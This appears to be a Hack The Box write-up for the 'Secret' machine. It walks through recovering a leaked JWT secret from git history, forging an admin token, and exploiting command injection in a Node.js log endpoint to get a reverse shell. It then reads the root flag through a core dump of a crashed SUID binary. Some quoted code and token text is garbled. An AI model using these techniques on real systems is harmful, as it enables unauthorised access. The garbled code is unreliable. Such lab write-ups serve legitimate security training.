---
layout: single
title: Secret - Hack The Box
date: 2021-12-21
desc: "Secret is a fun and tricky machine where we have to find the secret key at that file.zip we did download. When we find the secret key we must forge the malicious jwt token to gain access to the API with admin privileges and obtain remote code execution adding a special character at the end of URL with reverse shell payload. At the root part we found a SUID binary file with source code in C. At this point we run the binary file and we cause a segmentation fault and obtain the root flag at /var/crash."
category: "boot2root"
---

<h1 align="center">
<img src="/assets/images/htb-writeup-secret/secret-banner.png">
</h1>

<hr>

Secret is a fun and tricky machine where we have to find the secret key at that file.zip we did download. When we find the secret key we must forge the malicious jwt token to gain access to the API with admin privileges and obtain remote code execution adding a special character at the end of URL with reverse shell payload. At the root part we found a SUID binary file with source code in C. At this point we run the binary file and we cause a segmentation fault and obtain the root flag at /var/crash.

## Network Enumeration

```
PORT	STATE SERVICE VERSION
22/tcp	open  ssh	OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
80/tcp 	open  http	nginx 1.18.0 (Ubuntu)
3000/tcp open http 	Node.js	(Express middleware)
| http-methods:
|_ Supported Methods: GET HEAD POST OPTIONS
|_http_title: DUMB Docs
```

## Directory Enumeration
```
/download
/docs
/assets
/api
/Docs
/API
/DOCS
```

## Website
On the website, we will find a downloadable file (files.zip) which in it contains the secret key for jwt token signature.

```
$ git log
  commit 67dxxxxxxxxxxxxxx
  Author: dasithsv  
  Date: Fri Sep 3 11:30:17 2021 +0530

  removed .env for security reasons


$ git show 67dxxxxxxxxxxxxxx
  commit 67dxxxxxxxxxxxxxx
  Author: dasithsv  
  Date: Fri Sep 3 11:30:17 2021 +0530
  removed .env for security reasons
  diff --git a/.env b/.env 
  index fb6f587..31db370 100644 
  --- a/.env
  +++ b/.env 
  @@ -1,2 +1,2 @@ 
  DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
  -TOKEN_SECRET = gXr67xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
  +TOKEN_SECRET = secret
```

## User Register with curl

```
curl -d '{"name":"dhmos1","email":"dhmosfnk@xxxxx.com","password","123456789"}' -H "Content-Type:application/json" -X POST http://10.10.11.120:3000/api/user/register
R=> {"user":"dhmos1"}
```

## User Login/Get auth token

```
curl -d '{"email":"dhmosfnk@xxxxx.com","password":"123456"}'-H "Content-Type: application/json" -X POST http://10.10.11.120:3000/api/user/login
Token=> eyJhbGciOiJlUzl1NilsInR5cC161kp XVCj9.eyJfaWQiOiI2MTg1NzgzMjU1ZmVh NjA0NjAyM2MOOTUiLCJuYW1lljoiZGhtb3Mxliwizwi
```
<br>
JWT Token the three parts are encoded separately using Base64url Encoding RFC 4648, and concatenated using periods to produce the JWT: <br>

```js
const token = base64urlEncoding(header) +' + base64urlEncoding(payload) +!' + base64urlencoding(signature)
```

## Send GET Request with JWT Token

![](/assets/images/htb-writeup-secret/get_jwt_token.PNG)

<br>

How JWT Token verify works 
<hr>

![](/assets/images/htb-writeup-secret/jwt_token_works.png)


## Manipulation JWT Auth-Token

Verification source code (private.js)
```js
router.get('/priv', verifytoken, (req, res) => {
  // res.send(req.user)
  
  const userinfo = { name: req.user }
  
  const name = userinfo.name.name;
  
  if (name == 'theadmin'){ 
    res.json ({ 
      creds:{
        role: "admin", 
        username:"theadmin", 
        desc: "welcome back admin,"
      }
    }) 
  }
}
```
As we can see in source code we need only the same name with admin for auth for a simple user or a admin user. <br>
For forging the token i suggest 2 tools [jwt_tool](https://github.com/ticarpi/jwt_tool) and [jwt.io](https://jwt.io/).
<br> D'ONT FORGET TO USE THE SECRET KEY FOR KEY VALIDATION 

![](/assets/images/htb-writeup-secret/get_jwt_admin.png)

## Remote Code Execution

Source code for API /api/priv
```js
router.get('/logs', verifytoken, (req, res) => {
  const file = req.query.file;
  const userinfo = { name: req.user } 
  const name = userinfo.name.name;
  
  if (name == 'theadmin'){
    const getLogs = 'git log --oneline ${file}'; 
    exec(getLogs, (err , output) => { 
      if(err){
        res.status (500).send(err); 
        return
      }
      res.json (output);
    })
  } 
}
```
![](/assets/images/htb-writeup-secret/rce.PNG)

## Reverse Shell
1. Fist of all we must create a file with reverse shell payload<br>
![](/assets/images/htb-writeup-secret/payload_rvs.PNG)

2. Start a Simple HTTP Server with python<br>
![](/assets/images/htb-writeup-secret/httpserver.PNG)

3. Start a netcat listener<br> 
![](/assets/images/htb-writeup-secret/listener.PNG)

4. Curl the reverse shell payload with GET Request <br>
![](/assets/images/htb-writeup-secret/rvs_payload.PNG)

5. Stabilize the shell
```
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
$ Ctrl-Z
$ stty raw -echo
$ export TERM=xterm
```
6. Get user flag <br>
![](/assets/images/htb-writeup-secret/user_flag.PNG)

## Privilege Escalation

### Enumeration 
Search for SUID binary files
```
# Command
find / -user root -perm -4000 -exec ls -ldb {} \; > /tmp/enumeration
```
![](/assets/images/htb-writeup-secret/suid_file.PNG)

Change directory /opt and we will see 3 files downloand the .C file (code.c)

## Source Code Enumeration
```c
void filecount (const char *path, char *summary)
{
  FILE *file; 
  char ch; 
  int characters, words, lines;
  
  file = fopen(path, "r"); 
  if (file == NULL)
  {
    printf("\nUnable to open file. \n"); 
    printf("Please check if file exists and you have read privilege. \n"); 
    exit(EXIT_FAILURE);
  }
  
  characters = words = lines = 0; 
  while ((ch = fgetc(file)) != EOF)
  {
    characters++; 
    if (ch == 'in' || ch == '10')
      lines++; 
    if (ch == ''Il ch == 'It' || ch == 'in' || ch == '10')
      words++;
  }
  
  if (characters > 0)
  {
    words++; 
    lines++;
  }
  snprintf(summary, 256, "Total characters = %d\nTotal words  = %d\nTotal lines = %d\n", characters, words, lines);
  printf("\n%s", summary);
}
```

## void filecount (xx,xx)
The developer has forgotten to close the file where has open for counting the characters also the developer left code in the file "core dump" the application if it crashes. Linux keeps a buffer of all the files a process opens. When it reads the content of the file, it stores that information in the buffer for easy access later. The buffer is located in the memory that Linux reserves for the process. When you close a file, Linux flushes that buffer (i.e. it removes the content) and deallocates the space.
We know that this developer is not closing the file at the end of the function. And we know that if the program crashes for memory segmentation issues, that operatives system will create a core dump. We also know that a core dump will contain a snapshot of the memory of the process at the time of the crash.
we must to cause a segment violation in the count binary after reading the content of /root/root.txt and them read the core dump and locate the contect of the file in there.


First of all need to have 2 terminals in the attack machine: <br>
1. Terminal for start the binary(count) program and read the root.txt<br>
2. Terminal for send the SIGSEGV to the proces and read the core dump file


Lets do the steps one by one:
<br>
1. Start the binary program enter for source file /root/root.txt and stop when the program asks for save results.
![](/assets/images/htb-writeup-secret/start_bin.PNG)

2. Cause a segmentation fault and read the core dump

```
# Cause a segmentation fault to the proces
$ ps aux | grep count
$ kill -SIGSEGV PID

# Read core dump root.txt
$ cd /var/crash
$ apport-unpack filename /destination
$ strings CoreDump
```

![](/assets/images/htb-writeup-secret/rootflag.PNG)

